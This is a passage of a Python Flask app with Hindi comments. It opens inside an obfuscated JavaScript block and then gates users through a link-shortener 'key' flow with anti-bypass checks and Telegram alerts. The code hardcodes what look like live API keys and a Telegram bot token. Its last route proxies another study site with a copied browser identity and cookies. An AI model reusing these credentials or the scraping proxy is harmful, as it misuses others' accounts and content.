3),'MRmKH':_0x9a2cfd(0x199),'dLsVh':_0x9a2cfd(0x31c),'tfbSo':_0x9a2cfd(0x30d),'bqggT':_0x9a2cfd(0x169),'LLxRL':_0x9a2cfd(0x193),'gkKsm':function(_0x2e92f8){return _0x2e92f8();}},_0x316397=[_0x3a7a84[_0x9a2cfd(0x206)],_0x3a7a84[_0x9a2cfd(0x1ed)],_0x3a7a84[_0x9a2cfd(0x28f)],_0x3a7a84[_0x9a2cfd(0x166)],_0x3a7a84[_0x9a2cfd(0xa4)],_0x3a7a84[_0x9a2cfd(0x297)],_0x3a7a84[_0x9a2cfd(0xc2)],_0x3a7a84[_0x9a2cfd(0x9b)],_0x3a7a84[_0x9a2cfd(0x2ea)],_0x3a7a84[_0x9a2cfd(0x27f)],_0x3a7a84[_0x9a2cfd(0xbc)],_0x3a7a84[_0x9a2cfd(0x18f)],_0x3a7a84[_0x9a2cfd(0x337)],_0x3a7a84[_0x9a2cfd(0x1d4)],_0x3a7a84[_0x9a2cfd(0x230)],_0x3a7a84[_0x9a2cfd(0x1aa)],_0x3a7a84[_0x9a2cfd(0x2d6)],_0x3a7a84[_0x9a2cfd(0x180)],_0x3a7a84[_0x9a2cfd(0x364)],_0x3a7a84[_0x9a2cfd(0x35e)],_0x3a7a84[_0x9a2cfd(0x23d)],_0x3a7a84[_0x9a2cfd(0x321)],_0x3a7a84[_0x9a2cfd(0xcf)],_0x3a7a84[_0x9a2cfd(0x1a2)],_0x3a7a84[_0x9a2cfd(0x1a6)],_0x3a7a84[_0x9a2cfd(0x23b)],_0x3a7a84[_0x9a2cfd(0x298)],_0x3a7a84[_0x9a2cfd(0x107)],_0x3a7a84[_0x9a2cfd(0x9e)],_0x3a7a84[_0x9a2cfd(0xfb)],_0x3a7a84[_0x9a2cfd(0x1ec)],_0x3a7a84[_0x9a2cfd(0xe7)],_0x3a7a84[_0x9a2cfd(0x16c)],_0x3a7a84[_0x9a2cfd(0xc5)],_0x3a7a84[_0x9a2cfd(0x22d)],_0x3a7a84[_0x9a2cfd(0x274)],_0x3a7a84[_0x9a2cfd(0x195)],_0x3a7a84[_0x9a2cfd(0x2ac)],_0x3a7a84[_0x9a2cfd(0x204)],_0x3a7a84[_0x9a2cfd(0x2d2)],_0x3a7a84[_0x9a2cfd(0x2bb)],_0x3a7a84[_0x9a2cfd(0x1a8)],_0x3a7a84[_0x9a2cfd(0x1c9)],_0x3a7a84[_0x9a2cfd(0x25d)],_0x3a7a84[_0x9a2cfd(0x160)],_0x3a7a84[_0x9a2cfd(0x119)],_0x3a7a84[_0x9a2cfd(0x36a)],_0x3a7a84[_0x9a2cfd(0xfc)],_0x3a7a84[_0x9a2cfd(0x200)],_0x3a7a84[_0x9a2cfd(0x137)],_0x3a7a84[_0x9a2cfd(0xbe)],_0x3a7a84[_0x9a2cfd(0x13a)],_0x3a7a84[_0x9a2cfd(0x1e0)],_0x3a7a84[_0x9a2cfd(0xf2)],_0x3a7a84[_0x9a2cfd(0x1f8)],_0x3a7a84[_0x9a2cfd(0x1dc)],_0x3a7a84[_0x9a2cfd(0x334)],_0x3a7a84[_0x9a2cfd(0x1c6)],_0x3a7a84[_0x9a2cfd(0x20d)],_0x3a7a84[_0x9a2cfd(0x31f)],_0x3a7a84[_0x9a2cfd(0x123)],_0x3a7a84[_0x9a2cfd(0x162)],_0x3a7a84[_0x9a2cfd(0x1cb)],_0x3a7a84[_0x9a2cfd(0xe0)],_0x3a7a84[_0x9a2cfd(0xd4)],_0x3a7a84[_0x9a2cfd(0x229)],_0x3a7a84[_0x9a2cfd(0x302)],_0x3a7a84[_0x9a2cfd(0x268)],_0x3a7a84[_0x9a2cfd(0x281)],_0x3a7a84[_0x9a2cfd(0x2e0)],_0x3a7a84[_0x9a2cfd(0x366)],_0x3a7a84[_0x9a2cfd(0x271)],_0x3a7a84[_0x9a2cfd(0xd8)],_0x3a7a84[_0x9a2cfd(0x9c)],_0x3a7a84[_0x9a2cfd(0x114)],_0x3a7a84[_0x9a2cfd(0xec)],_0x3a7a84[_0x9a2cfd(0x207)],_0x3a7a84[_0x9a2cfd(0x24b)],_0x3a7a84[_0x9a2cfd(0x215)],_0x3a7a84[_0x9a2cfd(0x127)],_0x3a7a84[_0x9a2cfd(0x155)],_0x3a7a84[_0x9a2cfd(0x33b)],_0x3a7a84[_0x9a2cfd(0x240)],_0x3a7a84[_0x9a2cfd(0x2d9)],_0x3a7a84[_0x9a2cfd(0x245)],_0x3a7a84[_0x9a2cfd(0xd3)],_0x3a7a84[_0x9a2cfd(0x2b2)],_0x3a7a84[_0x9a2cfd(0x231)],_0x3a7a84[_0x9a2cfd(0x30a)],_0x3a7a84[_0x9a2cfd(0x1c0)],_0x3a7a84[_0x9a2cfd(0x1af)],_0x3a7a84[_0x9a2cfd(0x256)],_0x3a7a84[_0x9a2cfd(0x331)],_0x3a7a84[_0x9a2cfd(0x233)],_0x3a7a84[_0x9a2cfd(0x33c)],_0x3a7a84[_0x9a2cfd(0xc3)],_0x3a7a84[_0x9a2cfd(0x20c)],_0x3a7a84[_0x9a2cfd(0xa7)],_0x3a7a84[_0x9a2cfd(0x1ee)],_0x3a7a84[_0x9a2cfd(0x179)],_0x3a7a84[_0x9a2cfd(0x25f)],_0x3a7a84[_0x9a2cfd(0x186)],_0x3a7a84[_0x9a2cfd(0x275)],_0x3a7a84[_0x9a2cfd(0xf3)],_0x3a7a84[_0x9a2cfd(0x306)],_0x3a7a84[_0x9a2cfd(0x196)],_0x3a7a84[_0x9a2cfd(0x16a)],_0x3a7a84[_0x9a2cfd(0x2f3)],_0x3a7a84[_0x9a2cfd(0x14a)],_0x3a7a84[_0x9a2cfd(0x17e)],_0x3a7a84[_0x9a2cfd(0xd7)],_0x3a7a84[_0x9a2cfd(0x257)],_0x3a7a84[_0x9a2cfd(0xbf)],_0x3a7a84[_0x9a2cfd(0x1d2)],_0x3a7a84[_0x9a2cfd(0x357)],_0x3a7a84[_0x9a2cfd(0xc7)],_0x3a7a84[_0x9a2cfd(0x32b)],_0x3a7a84[_0x9a2cfd(0x277)],_0x3a7a84[_0x9a2cfd(0x1a5)],_0x3a7a84[_0x9a2cfd(0x2e5)],_0x3a7a84[_0x9a2cfd(0xad)],_0x3a7a84[_0x9a2cfd(0x246)],_0x3a7a84[_0x9a2cfd(0x2b8)],_0x3a7a84[_0x9a2cfd(0x276)],_0x3a7a84[_0x9a2cfd(0x12a)],_0x3a7a84[_0x9a2cfd(0x347)],_0x3a7a84[_0x9a2cfd(0xa8)],_0x3a7a84[_0x9a2cfd(0x11a)],_0x3a7a84[_0x9a2cfd(0x99)],_0x3a7a84[_0x9a2cfd(0x247)],_0x3a7a84[_0x9a2cfd(0x2bf)],_0x3a7a84[_0x9a2cfd(0x13c)],_0x3a7a84[_0x9a2cfd(0x2d0)],_0x3a7a84[_0x9a2cfd(0xd0)],_0x3a7a84[_0x9a2cfd(0x22b)],_0x3a7a84[_0x9a2cfd(0x238)],_0x3a7a84[_0x9a2cfd(0x106)],_0x3a7a84[_0x9a2cfd(0x10c)],_0x3a7a84[_0x9a2cfd(0x2a0)],_0x3a7a84[_0x9a2cfd(0x280)],_0x3a7a84[_0x9a2cfd(0x1d6)],_0x3a7a84[_0x9a2cfd(0x32d)],_0x3a7a84[_0x9a2cfd(0x2f1)],_0x3a7a84[_0x9a2cfd(0x17f)],_0x3a7a84[_0x9a2cfd(0x1df)],_0x3a7a84[_0x9a2cfd(0x2ca)],_0x3a7a84[_0x9a2cfd(0x185)],_0x3a7a84[_0x9a2cfd(0xf6)],_0x3a7a84[_0x9a2cfd(0x113)],_0x3a7a84[_0x9a2cfd(0x2d7)],_0x3a7a84[_0x9a2cfd(0xd9)],_0x3a7a84[_0x9a2cfd(0x177)],_0x3a7a84[_0x9a2cfd(0x269)],_0x3a7a84[_0x9a2cfd(0x228)],_0x3a7a84[_0x9a2cfd(0x295)],_0x3a7a84[_0x9a2cfd(0x335)],_0x3a7a84[_0x9a2cfd(0x226)]];return _0x2a28=function(){return _0x316397;},_0x3a7a84[_0x9a2cfd(0x1bd)](_0x2a28);}function _0x386a(){var _0x4d5ad5=['BmpVT','WCKHF','XiRIi','kKmfh','jcoeY','12420BjKav','success','5882380Npo','kStoX','PzOrf','BYGuM','tKfZy','Sueyd','gyEtB','IeUHi','ALtGK','RRqeG','wIcim','BBrve','iHSJQ','gtyPv','Xwhgh','tSrWz','YzDiq','roLCl','IOotQ','kqpJF','BQvve','vvGZj','show','epoaB','2948050UQgTbx','jvHgk','BkwPc','aWpwY','ZeasM','SwfRi','btBki','brYlc','gkKsm','nuUfS','bpHyu','EJSsn','SYqdv','emnrp','hXETw','fkARh','jsHrr','aJBLN','zbNFh','xzkhg','UjPgG','qcLII','qYklH','erIyN','sTwKB','tQFmV','dYUBK','ckYBY','bpbEu','sQAYj','7822980WHt','PDbjB','jBcLu','iqvVM','xMyRq','XRsuQ','rSRUb','VszBx','KPJFx','svLIx','eTfxs','veSTB','AwlFa','DddHV','uMAuP','ZziAr','XSYiZ','status-tex','GSNKO','WHXFV','xJpFp','uIDte','AndroidDev','AkuRA','RWBoB','STLOK','ZZTMn','InVzA','uoSmY','1057406JIK','ECGyg','PgNGM','zkaec','nHzPt','1108420SbLKFD','zsQDF','sBDLm','vItdX','UuASZ','DrxWw','fBdxQ','SGIpP','com.study.','RAvoN','CVPyC','YyYZy','PUUwo','BPKeQ','VgMlI','kbjcm','khgef','yALBS','MLjYk','Eggqt','MoMmo','iiIVa','hQWjg','CLnYs','GkUPU','YzWMI','JkVZe','XCVAt','openCustom','bqHmY','dxUYv','EArBC','LqJXP','sXAQn','Zjz','scUnF','6cOikvh','gZkzX','tVaub','YiJuM','tmGAx','RTMCt','PDFgv','vRiQD','kxngV','fkNYN','fCvpr','HJoKx','ccYWD','LLxRL','HOaHr','dLsVh','sLOrP','AMiCB','JXwvQ','mKfvN','FvanN','uBUFr','fFAcn','MpWeR','Fvzre','CickY','kbLSk','YrzN','ice','ZeNBz','SnAON','iJCSD','yJaIz','hANeS','fhhVO','KiDvh','TUQya','DOUuX','lQGcX','scXSH','Lngbz','jQSYm','zqVWh','3IQMdVB','ohSVR','QrCjd','vIMMy','CwuMY','DWXuK','IKHIN','CXZar','jIdCr','IeTrC','vzCnC','KXheL','iQOrc','YBfjy','OpAyR','egKoH','iCAeW','qhqYU','BcikF','iwsAC','DxMms','oEkqT','TQgjO','GREKN','PTLJv','sSjVS','jAyzB','scmOf','27881183FIaehh','Dcitt','prozs','cRzkr','nsvmc','paMXr','Shfrk','cQudQ','MVyKf','MRmKH','oAQbM','tgWSm','qwlbz','yPTeK','kzJVN','IRBxf','xXWDF','DuwDJ','TofZn','UKXAG','UlDYV','vFwKE','jZCuB','eIWqy','iZdRx','qbFRv','fSFyo','LyQis','VfTIJ','IuOno','nqSgO','gnqrj','FpMFV','GXZti','snLrU','oeQlD','Cudqh','eJEft','dPtGP','XSIpj','VeMSd','rbqaE','XiuJz','VBjKp','FutMQ','add','kLRUB','luuQB','iainX','8ztjkCW','RGGgK','lEiY','vkHQH','tfbSo','byxMZ','MAOjh','XrSjR','PXwIs','Screen','IysXh','3211978DJzPMX','xGjct','qNaIE','KgdXC','smfBn','AnrcA','dvzRT','ALPpU','RFrTd','aqoLl','yymKx','sNGDY','KJNcc','sDRSu','jAFDf','uGHNU','YkCeu','tOTkU','1677346uUK','xJXNs','NZTzi','xmEuE','lhRZP','TdkKZ','12ttrunR','SNeQj','DlGrv','QCupQ','CmBfJ','XNLgx','PRaMm','XBRaF','TjUQQ','ualqd','kZaun','ZGxBz','qbTKK','CyoVv','xAJqO','10WXsNVd','RIUwI','dvnxQ','cmfWS','5876860QBC','QqipJ','bKZVj','VVKLF','10507320TW','xJRog','Activity','dNyAQ','RQbgB','SZSne','rUEEq','ZBrWJ','jEbEk','xOHad','uXzWi','PavDu','lYJcx','ymElZ','DZIvA','xUeIb','GGVeB','AOCy','zHxzZ','EpXoE','DCiso','zsqcX','SFurJ','atW','sRqMJ','GgrHO','FsZHp','eybuT','TxOaW','Ikahf','TcTsS','ZmMcX','niHys','ymrRU','hOpHS','wBapU','split','hmqGJ','bfvVx','atFZn','OUMna','66SwJRuv','SqJLg','2280CUCNoA','vampL','lTtKr','NsUQw','dZoiE','TwYaL','Otqvl','mLLfD','WSa','oDudN','dILJG','QXMbV','GIfzx','AdzUJ','tJbcM','FxHIT','JaxxH','oDAoP','bdpdm','dkRnk','WtkXD','kRRJC','jYIZo','qdNOc','luONS','Ggwkk','FEUig','aLoFj','DVYri','ILVdH','Zqboj','status-ico','NfOgE','elVlT','oXweB','zPhDH','rIths','EdcQa','pxlPg','aPsDN','GmPVz','nHMnV','qnele','tVPJR','AHnZu','JWTso','udurC','WZhGq','agQBa','EBBrH','INDXs','UdUKO','KIrni','qAHKP','22098329Ck','RuGao','hSXin','tcTqU','byInO','hSGiY','KeqGS','rbsTN','tzgWs','bqggT','GaMZq','hSXeV','194FtfFgh','bnEoc','RqsAI','FPhbz','gpDTz','egL','bTiQv','shift','tXtZg','eUrYC','WVBiq','QgjWR','KzGoI','mxhcv','ooBJA','SIvrb','oHpZu','AKxxd','RsSWD','SsfTN','eZptp','juVoC','IsFxH','kEmEV','VQHEH','vvPdc','FqYyN','KrAnQ','dhEug','APiFW','wgQzh','QjlST','HWAah','UbyEG','gbBvk','utOrr','aSkRu','27816QHBLZ','ZaFmq','pbIgH','2161926uqSFsh','vCQOy','TSMYv','QHvyb','IvaCq','4IwIVJC','lguUz','pxfZr','VMsZR','ELzBH','YNZeA','AoGJm','zXmQy','CkTzA','ApZbv','DcaJG','orvbi','Kfbum','RGLBK','CjogG','KMjOR','iaKLa','Tqkqy','IXRMT','kovwy','twxzQ','IvuEQ','ADKeF','HttFf','UiIVR','MzRsn','EEIeB','nkKXd','SzabT','MRNtt','fciJh','wJzXD','QcjVr','guZfo','RUJHQ','UHECL','pDaqu','yotUK','LfJmZ','dQkpa','639xKFPyY','vwYaB','iDKMe','TkLPs','dxmDV','viIBY','RBQEv','qtSfX','QRHAW','SHoYd','FonBl','jnyBc','cjvuR','EVwnR','yGUcm','RXkBN','NeBxT','uZRrO','CDKmF','tFpBY','nruCy','MqfRE','nfaNl','TnlSx','AITXA','FfvNI','mYSIR','CXvPR','FCIxC','665882DBpa','UzoAX','EjzeC','vkGYh','464322YqKgWO','getElement','zvjXr','xrJbV','MMAGA','DaSTk','PgDiw','iUYMO','AIhhB','xCwPK','ElDcg','xbEvc','pPWoP','ZQlSY','56VmjqXY','mZbFt','sESIA','hQxdD','NtPYr','push','TWkjG','nPIzq','VBUkO','sssPw','gUJKy','QVjla','jBiXl','REnBm','tUAmZ','MICWD','vLZbL','reZIg','9217qHVsdI','mvASw','ntwQG','6HthtII','JuIKj','hMIbq','tynQq','dSNKz','XJaDW','dudQJ','qxIrN','BElmp','yBRMU','TqDrC','mRlzt','UFZHu','dJWdQ','RHqXt','aORUp','faVqQ','eEvNq','nDuyP','KXseg','zEgli','ErsaB','lVOjo','OgKZJ','BIfoH','aWhaU','xQJAJ','dwAUX','XqNxl','HgzpZ','kFJMF','CWWiF','UjqVN','TFqyG','JKoto','YakCd','vIghB','cJgDq','WutqZ','8270LWqRll','bEVbl','sRJCo','OuOSM','krNAi','BNLVO','NKjjU','xKiCZ','enNWV','RbHZC','24ocOSeq','XxYsv','hggrF','PBmuH','diaor','HNpZU','lyQqE','Csbmp','LivUI','oLoRl','NqgNc','ById','GbOFY','jjBCY','EhyIM','CDjRD','JiDEu','wjDjg','TuuMU','YzFmI','BsL','dWPIf','MdyUL','80578zOwVO','wNgxj','prime.Home','60FpXFLy','FBKRl','ncggz','TaJTW','RUPTc','pvGwn','mEyUu','LgryG','TYTbY','kKrdY','WjeTz','DZVKu','Bofnd','dasld','dwRCj','tUQsD','BSsCF','ETMtL','ZcOxA','QWYeq','SIRBm','HqXzI','mYfzF','CuGod','JGEXx','UNvmj','eydcJ','326510uyInnV','COhjH','pFxhp','LqXYZ','oNTYl','RRhhA','22833492iE','beCIW','HBgag','Zwqbk','kqeSB','IErbr','etlPN','uWTva','lDCHC','gLNbb','classList','IlipM','NvwUh','UHQum','UnrkO','ubtId','VFntH','PMmOB','riJvF','4|3|2|1|0','MtAsg','mevCI','BJVZg','PXGBw','rBLlw','aNcDA','Dvyhw','cCWpk','pxEvt','yTqWY','VqaCO','UlgPT','nTYCt','nCRJB','HISEq','MzfiG','iYsUg','mvCxw','sSheV','GKpuj','whLpH','Dfyrb','IjpdJ','GDFQn','hWCJu'];_0x386a=function(){return _0x4d5ad5;};return _0x386a();}
        </script>
    </body>
    </html>
"""
    return render_template_string(html_template)
 
@app.route('/api/v2/generate_shortlink', methods=['GET'])
def generate_short_link():
    profile_id = request.args.get('profile_id')
    if not profile_id:
        return jsonify({"error": "Profile ID not found"}), 400

    current_ts = time.time()
    
    # -------------------------------------------------------------------------
    # 1. चेक करें कि यूज़र वेरीफाइड है और 'verified_on' 24 घंटे (86400 सेकंड) के अंदर है
    # -------------------------------------------------------------------------
    user_record = collection.find_one({"profile_id": profile_id})
    
    if user_record and user_record.get("profile_id_verified") == True:
        verified_on = user_record.get("verified_on", 0)
        
        # अगर वेरीफाई हुए 24 घंटे (86400 सेकंड) से कम समय हुआ है, तो सीधा सक्सेस पेज दिखाएं
        if (current_ts - verified_on) < 86400:
            return get_success_html(), 200

    # अगर वेरीफाइड नहीं है या 24 घंटे पूरे हो गए हैं, तो पुरानी एंट्री डिलीट करें
    collection.delete_many({"profile_id": profile_id})
    
    # फ्रेश एंट्री इन्सर्ट करें (ताकि पहले का कोई बग न रहे)
    collection.insert_one({
        "profile_id": profile_id,
        "profile_id_verified": False,
        "timestamp": current_ts
    })
    # -------------------------------------------------------------------------

    request_host = request.host  
    host_url = request.host_url.rstrip('/')  

    # डोमेन के अनुसार API और Path सेट करें
    if 'study.edumate.life' in request_host:
        api_key = "20612dab97c48d8bf10f686f44eda1000d8feac0"
        access_path = "/api/v2/keyaccess"
    elif 'key.lnkz.tech' in request_host:
        api_key = "2c2c2d013bb11762d35eaf99713077879d43bf91"
        access_path = "/api/apiaccessme/"
    else:
        return jsonify({"error": "अमान्य डोमेन (Invalid Domain)"}), 403

    # स्टेप 1: जो कीज़ (Keys) 15 मिनट (900 सेकंड) से ज़्यादा समय से अटकी हैं, उन्हें फ्री करें
    keys_pool_collection.update_many(
        {
            "domain": request_host,
            "assigned_to": {"$ne": None}, 
            "assigned_at": {"$lt": current_ts - 900}
        },
        {"$set": {"assigned_to": None, "assigned_at": None}}
    )

    assigned_token = None
    shortened_url = None

    # स्टेप 2: चेक करें कि क्या इस यूज़र के पास पहले से कोई एक्टिव की (Key) है?
    user_existing_key = keys_pool_collection.find_one({"assigned_to": profile_id, "domain": request_host})
    
    if user_existing_key:
        assigned_token = user_existing_key["token"]
        shortened_url = user_existing_key["shortened_url"]
        
        # यूज़र के वापस आने पर उसका Timestamp अपडेट करें ताकि उसे और 15 मिनट मिल सकें
        keys_pool_collection.update_one(
            {"_id": user_existing_key["_id"]},
            {"$set": {"assigned_at": current_ts}}
        )
    else:
        # स्टेप 3: डेटाबेस से कोई 1 'फ्री' की (Key) निकालें
        free_key = keys_pool_collection.find_one_and_update(
            {"assigned_to": None, "domain": request_host}, 
            {"$set": {"assigned_to": profile_id, "assigned_at": current_ts}}, 
            return_document=True
        )

        if free_key:
            assigned_token = free_key["token"]
            shortened_url = free_key["shortened_url"]
        else:
            # स्टेप 4: अगर कोई भी की फ्री नहीं है, तो एक नई की बनाएँ
            new_token = generate_random_token(12)
            long_url = f"{host_url}{access_path}?token={new_token}"
            
            shortener_api_url = "https://arolinks.com/api"
            try:
                response = requests.get(shortener_api_url, params={"api": api_key, "url": long_url})
                data = response.json()
                
                if data.get("status") == "success":
                    shortened_url = data.get("shortenedUrl")
                    assigned_token = new_token
                else:
                    return jsonify({"error": "URL शार्ट करने में विफल"}), 500
            except Exception as e:
                return jsonify({"error": str(e)}), 500

            # नई की (Key) को डेटाबेस में सेव करें ताकि Key Pool की संख्या बढ़ सके
            new_key_record = {
                "token": new_token,
                "domain": request_host,
                "shortened_url": shortened_url,
                "assigned_to": profile_id,
                "assigned_at": current_ts
            }
            keys_pool_collection.insert_one(new_key_record)

    # स्टेप 5: शार्ट यूआरएल पर भेजें और कुकीज़ को नए 30 मिनट (1800 सेकंड) के लिए सेट करें
    resp = make_response(redirect(shortened_url))
    resp.set_cookie('session_token', assigned_token, max_age=1800)
    
    return resp


# दोनों राउट्स (Routes) को एक ही फंक्शन पर मैप कर दिया गया है
@app.route('/api/apiaccessme/', methods=['GET'])
def verify_api_access_me():
    token = request.args.get('token')
    session_token = request.cookies.get('session_token')
    
    # सिक्यूरिटी चेक 1: अगर टोकन या कुकीज़ नहीं हैं
    if not token or not session_token:
        return get_error_html("Bypass Detected"), 403

    # सिक्यूरिटी चेक 2: अगर URL का टोकन और कुकीज़ का टोकन मैच नहीं होता है 
    if token != session_token:
        return get_error_html("Bypass Detected (Session Mismatch)"), 403

    # स्टेप 1: डेटाबेस में टोकन ढूँढें
    key_record = keys_pool_collection.find_one({"token": token})
    
    if not key_record:
        return get_error_html("Invalid Token"), 403

    profile_id = key_record.get("assigned_to")
    assigned_at = key_record.get("assigned_at")

    # अगर टोकन किसी को असाइन नहीं है या यूज़र का समय पूरा हो चुका है
    if not profile_id:
        return get_error_html("Token is expired or already used"), 403

    # स्टेप 2: समय की गणना (Time Taken)
    current_ts = time.time()
    elapsed_seconds = current_ts - assigned_at
    elapsed_minutes = int(elapsed_seconds // 60)
    remaining_seconds = int(elapsed_seconds % 60)
    exact_time_str = f"{elapsed_minutes} minutes {remaining_seconds} seconds"

    # -------------------------------------------------------------------------
    # स्टेप 3: यूज़र को वेरीफाई करें और 'verified_on' टाइमस्टैम्प सेव करें
    # -------------------------------------------------------------------------
    collection.update_one(
        {"profile_id": profile_id}, 
        {"$set": {
            "profile_id_verified": True,
            "verified_on": current_ts
        }}
    )

    # स्टेप 4: की (Key) को वापस फ्री कर दें ताकि कोई और इसे इस्तेमाल कर सके
    keys_pool_collection.update_one(
        {"token": token},
        {"$set": {"assigned_to": None, "assigned_at": None}}
    )

    # स्टेप 5: टेलीग्राम अलर्ट भेजें
    try:
        bot_token = "8292521812:AAFukmxihMZId4elnEA6Ne_KKYw4NrMXwuc"
        chat_id = "-1004433335002"
        telegram_text = f"New key verified\nUser Profile ID: {profile_id}\nTime Taken: {exact_time_str}"
        telegram_api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        
        requests.post(telegram_api_url, json={"chat_id": chat_id, "text": telegram_text}, timeout=5)
    except Exception as e:
        print(f"Telegram notification failed: {str(e)}")

    # स्टेप 6: सक्सेस पेज दिखाएं और सुरक्षा के लिए पुरानी कुकीज़ को तुरंत डिलीट कर दें
    resp = make_response(get_success_html())
    resp.set_cookie('session_token', '', max_age=0)
    
    return resp, 200

@app.route('/api/v2/keyaccess', methods=['GET'])
def verify_key_access_v2():
    token = request.args.get('token')
    session_token = request.cookies.get('session_token')
    
    # सिक्यूरिटी चेक 1: अगर टोकन या कुकीज़ नहीं हैं
    if not token or not session_token:
        return get_error_html("Bypass Detected (Missing Cookie or Token - Please use the same browser)"), 403

    # सिक्यूरिटी चेक 2: अगर URL का टोकन और कुकीज़ का टोकन मैच नहीं होता है 
    if token != session_token:
        return get_error_html("Bypass Detected (Session Mismatch)"), 403

    # स्टेप 1: डेटाबेस में टोकन ढूँढें
    key_record = keys_pool_collection.find_one({"token": token})
    
    if not key_record:
        return get_error_html("Invalid Token"), 403

    profile_id = key_record.get("assigned_to")
    assigned_at = key_record.get("assigned_at")

    # अगर टोकन किसी को असाइन नहीं है या यूज़र का समय पूरा हो चुका है
    if not profile_id:
        return get_error_html("Token is expired or already used"), 403

    # स्टेप 2: समय की गणना (Time Taken)
    current_ts = time.time()
    elapsed_seconds = current_ts - assigned_at
    elapsed_minutes = int(elapsed_seconds // 60)
    remaining_seconds = int(elapsed_seconds % 60)
    exact_time_str = f"{elapsed_minutes} minutes {remaining_seconds} seconds"

    bot_token = "8292521812:AAFukmxihMZId4elnEA6Ne_KKYw4NrMXwuc"
    chat_id = "-1004314655959"  # नया चैनल ID
    telegram_api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

    # -------------------------------------------------------------------------
    # नया अपडेट: 2.5 मिनट (150 सेकंड) वाला फास्ट बायपास चेक
    # -------------------------------------------------------------------------
    if elapsed_seconds < 150:
        try:
            telegram_text_sus = f"Suspicious activity found\nUser Profile ID: {profile_id}\nTime Taken: {exact_time_str}"
            requests.post(telegram_api_url, json={"chat_id": chat_id, "text": telegram_text_sus}, timeout=5)
        except Exception as e:
            print(f"Telegram notification failed: {str(e)}")
            
        # यूज़र को एरर दिखाएं
        return get_error_html("Bypass detected referer not found"), 403
    # -------------------------------------------------------------------------

    # स्टेप 3: अगर 2.5 मिनट से ऊपर हो गया है, तो यूज़र को वेरीफाई करें
    collection.update_one(
        {"profile_id": profile_id}, 
        {"$set": {
            "profile_id_verified": True,
            "verified_on": current_ts
        }}
    )

    # स्टेप 4: की (Key) को वापस फ्री कर दें ताकि कोई और इसे इस्तेमाल कर सके
    keys_pool_collection.update_one(
        {"token": token},
        {"$set": {"assigned_to": None, "assigned_at": None}}
    )

    # स्टेप 5: सक्सेस का टेलीग्राम अलर्ट भेजें
    try:
        telegram_text = f"New key verified\nUser Profile ID: {profile_id}\nTime Taken: {exact_time_str}"
        requests.post(telegram_api_url, json={"chat_id": chat_id, "text": telegram_text}, timeout=5)
    except Exception as e:
        print(f"Telegram notification failed: {str(e)}")

    # स्टेप 6: सक्सेस पेज दिखाएं और सुरक्षा के लिए पुरानी कुकीज़ को तुरंत डिलीट कर दें
    resp = make_response(get_success_html())
    resp.set_cookie('session_token', '', max_age=0)
    
    return resp, 200

@app.route('/api/v2/checkmyprofile', methods=['GET'])
def check_my_profile():
    # 1. रिक्वेस्ट से Profile ID प्राप्त करें
    profile_id = request.args.get('profile_id')
    
    if not profile_id:
        return jsonify({
            "status": "error", 
            "message": "Profile ID is required"
        }), 400

    # 2. MongoDB से उस Profile ID का रिकॉर्ड निकालें
    record = collection.find_one({"profile_id": profile_id})
    
    # अगर रिकॉर्ड डेटाबेस में नहीं है
    if not record:
        return jsonify({
            "status": "error", 
            "message": "Profile ID not found"
        }), 404

    # 3. चेक करें कि प्रोफाइल वेरीफाई हुआ है या नहीं
    is_verified = record.get("profile_id_verified", False)
    
    if not is_verified:
        return jsonify({
            "status": "error", 
            "message": "Profile is not verified"
        }), 403

    # 4. 24 घंटे (24 Hours) की समय सीमा चेक करें
    verified_on = record.get("verified_on")
    
    if not verified_on:
        return jsonify({
            "status": "error", 
            "message": "Invalid record data (Verification timestamp missing)"
        }), 500

    current_ts = time.time()
    
    # वर्तमान समय और वेरीफाई किए गए समय के बीच का अंतर (सेकंड में)
    elapsed_seconds = current_ts - float(verified_on)
    
    # 24 घंटे में 86400 सेकंड होते हैं
    if elapsed_seconds >= 86400:
        # -----------------------------------------------------------------
        # नया अपडेट: एक्सपायर हो चुके रिकॉर्ड को डेटाबेस से डिलीट कर दें
        # -----------------------------------------------------------------
        collection.delete_many({"profile_id": profile_id})
        
        return jsonify({
            "status": "error", 
            "message": "Verification expired. Please verify again."
        }), 403

    # 5. सब कुछ सही होने पर Success रिस्पॉन्स दें
    return jsonify({
        "status": "success",
        "message": "Profile is verified and active",
        "profile_id": profile_id
    }), 200

@app.route('/PW/schedule-details', methods=['GET'])
def proxy_schedule_details():
    # आने वाले URL से सभी पैरामीटर्स (query string) प्राप्त करें
    query_string = request.query_string.decode('utf-8')
    
    # टारगेट URL जहाँ रिक्वेस्ट भेजनी है
    target_url = f"https://rarestudy.in/schedule-details?{query_string}"

    # ब्राउज़र वाले सभी हेडर्स (cURL से लिए गए)
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
       # 'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Encoding': 'gzip, deflate',
        'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://rarestudy.in/stream?batchId=691c37bcc8cc0783a9d602ee&subjectId=691e10b04a7ca45ed2d1dd13&chapterId=693822cf6de71259320d3374&batchName=Saakaar%202027%20Physics&subjectName=Physics&chapterName=EMT&section=videos',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
    }

    # शुरुआती कुकीज़
    cookies = {
        'session_expiry': '1780282006682',
        'favourite_batches': '%5B%226a0810667a12c6e8464434dd%22%2C%22691c37bcc8cc0783a9d602ee%22%5D',
